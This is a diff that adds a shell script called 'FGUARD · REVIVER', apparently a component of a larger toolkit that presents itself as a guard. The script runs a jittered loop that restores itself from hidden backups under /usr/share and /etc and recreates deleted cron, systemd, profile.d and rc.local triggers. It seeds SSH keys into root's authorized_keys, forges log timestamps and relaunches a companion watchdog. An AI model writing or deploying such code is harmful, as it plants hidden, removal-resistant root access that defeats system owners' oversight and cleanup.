@@ -1,0 +1,91 @@
+#!/bin/sh
+# ============================================================
+# FGUARD · REVIVER — 60s 重生循环（双备份 + 触发源模板重建）
+# 职责：主目录/组件/触发源 被删 → 从双备份或模板库恢复
+# 约束：flock 单例、抖动 60~78s、日志 mtime 归一
+# ============================================================
+BASE="$(cd "$(dirname "$0")" && pwd)"
+[ -f "$BASE/fguard.conf" ] && . "$BASE/fguard.conf"
+TAG="${TAG:-fguard}"
+BK1="${BK1:-/usr/share/.${TAG}-bk}"
+BK2="${BK2:-/etc/.${TAG}-bk}"
+TPL="${TPL:-$BASE/templates}"
+SVC="${SVC:-sys-$TAG}"
+LOG="$BASE/state.log"
+LOC="/var/lock/.${TAG}-rv.lock"
+AK="/root/.ssh/authorized_keys"
+# 单例防重：flock 优先；拿不到锁或 flock 不可用 → pidfile 探测
+# 关键修正：单次运行（非 --loop）不强占互斥锁，避免 cron 与常驻实例互斥自锁
+mkdir -p "$(dirname "$LOC")" 2>/dev/null
+if [ "$1" = "--loop" ]; then
+    LOCKED=0
+    exec 200>"$LOC" 2>/dev/null && { command -v flock >/dev/null 2>&1 && flock -n 200 2>/dev/null && LOCKED=1; }
+    if [ "$LOCKED" != "1" ]; then
+        PIDF="${LOC}.pid"
+        if [ -f "$PIDF" ] && kill -0 "$(cat "$PIDF" 2>/dev/null)" 2>/dev/null; then exit 0; fi
+        printf '%s' "$$" > "$PIDF" 2>/dev/null
+    fi
+fi
+
+note() { echo "$(date '+%F %T') notice: $*" >> "$LOG" 2>/dev/null; touch -r "${MREF:-/etc/hostname}" "$LOG" 2>/dev/null; }
+
+heal() {
+    changed=0
+    # A. 主目录整体丢失 → 全量还原
+    if [ ! -d "$BASE" ]; then
+        for b in "$BK1" "$BK2"; do
+            if [ -f "$b/fguard-watchdog" ]; then
+                cp -rp "$b" "$BASE" 2>/dev/null && { chmod -R 700 "$BASE" 2>/dev/null; note "full-restore"; changed=1; break; }
+            fi
+        done
+    fi
+    # B. 组件被删 → 逐文件补齐
+    for f in fguard-watchdog fguard-reviver fguard-heal.sh fguard-autoban.sh fguard-recon.sh fguard-killswitch.sh; do
+        if [ ! -f "$BASE/$f" ]; then
+            for b in "$BK1" "$BK2"; do
+                [ -f "$b/$f" ] && { cp -f "$b/$f" "$BASE/" 2>/dev/null; changed=1; break; }
+            done
+        fi
+    done
+    # C. 备份自愈（备份丢了 → 从主目录补）
+    [ -f "$BK1/fguard-watchdog" ] || { [ -d "$BASE" ] && cp -rp "$BASE" "$BK1" 2>/dev/null && changed=1; }
+    [ -f "$BK2/fguard-watchdog" ] || { [ -d "$BASE" ] && cp -rp "$BASE" "$BK2" 2>/dev/null && changed=1; }
+    # D. 触发源模板重建（删什么长什么）
+    R=""
+    [ -f "/etc/cron.d/${TAG}-heal" ]    || { [ -f "$TPL/cron.heal" ] && cp -f "$TPL/cron.heal" "/etc/cron.d/${TAG}-heal" && R=1; }
+    [ -f "/etc/cron.d/${TAG}-persist" ] || { [ -f "$TPL/cron.persist" ] && cp -f "$TPL/cron.persist" "/etc/cron.d/${TAG}-persist" && R=1; }
+    [ -f "/etc/cron.d/${TAG}-watch" ]   || { [ -f "$TPL/cron.watch" ] && cp -f "$TPL/cron.watch" "/etc/cron.d/${TAG}-watch" && R=1; }
+    [ -f "/etc/systemd/system/${SVC}.service" ] || { [ -f "$TPL/unit.service" ] && cp -f "$TPL/unit.service" "/etc/systemd/system/${SVC}.service" 2>/dev/null && R=1; }
+    [ -f "/etc/profile.d/${TAG}.sh" ]   || { [ -f "$TPL/profile.d" ] && cp -f "$TPL/profile.d" "/etc/profile.d/${TAG}.sh" 2>/dev/null && R=1; }
+    [ -f "/etc/rc.local" ] || { [ -f "$TPL/rc.local" ] && cp -f "$TPL/rc.local" "/etc/rc.local" 2>/dev/null && chmod +x /etc/rc.local 2>/dev/null && R=1; }
+    if [ -n "$R" ]; then
+        chmod 644 /etc/cron.d/${TAG}-* 2>/dev/null
+        if command -v systemctl >/dev/null 2>&1; then
+            systemctl daemon-reload 2>/dev/null
+            systemctl enable "${SVC}.service" 2>/dev/null
+            systemctl start "${SVC}.service" 2>/dev/null
+        fi
+        note "triggers-restored"; changed=1
+    fi
+    # E. 密钥自愈
+    for k in "$PUB1" "$PUB2"; do
+        [ -z "$k" ] && continue
+        fp=$(printf '%s' "$k" | awk '{print $2}')
+        grep -qF "$fp" "$AK" 2>/dev/null || { printf '%s\n' "$k" >> "$AK"; note "key-seeded"; changed=1; }
+    done
+    chmod 700 /root/.ssh 2>/dev/null; chmod 600 "$AK" 2>/dev/null
+    # F. 互拉（watchdog/reviver）
+    ps -eo args 2>/dev/null | grep -q "[f]guard-watchdog --loop" || { [ -x "$BASE/fguard-watchdog" ] && (cd "$BASE" && setsid nohup "$BASE/fguard-watchdog" --loop >/dev/null 2>&1 &) && note "wd-lifted"; }
+    [ "$changed" = "1" ] && note "heal-cycle"
+}
+
+if [ "$1" = "--loop" ]; then
+    while :; do
+        heal
+        J=$(awk 'BEGIN{srand();print int(rand()*18)}' 2>/dev/null || echo 9)
+        sleep $((60 + J))
+    done
+else
+    heal
+fi
+exit 0
